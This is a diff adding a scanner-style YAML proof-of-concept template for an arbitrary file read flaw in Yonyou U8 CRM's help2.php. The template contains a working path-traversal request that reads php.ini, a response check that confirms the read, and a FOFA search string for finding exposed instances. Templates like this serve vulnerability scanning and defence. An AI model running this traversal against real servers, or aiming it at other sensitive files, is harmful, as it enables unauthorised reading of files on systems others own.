@@ -1,0 +1,15 @@
+id: poc-yaml-yongyou-u8-crm-help2-php-anyfile-read
+info:
+  name: 用友U8 CRM客户关系管理系统 help2.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+requests:
+- method: GET
+  path: /pub/help2.php?key=/../../apache/php.ini
+  expression: status_code == 200 && contains(body,"[PHP]") && contains(body,"About
+    php.ini") && contains(body,"About this file")
+variables: {}
+transport: http
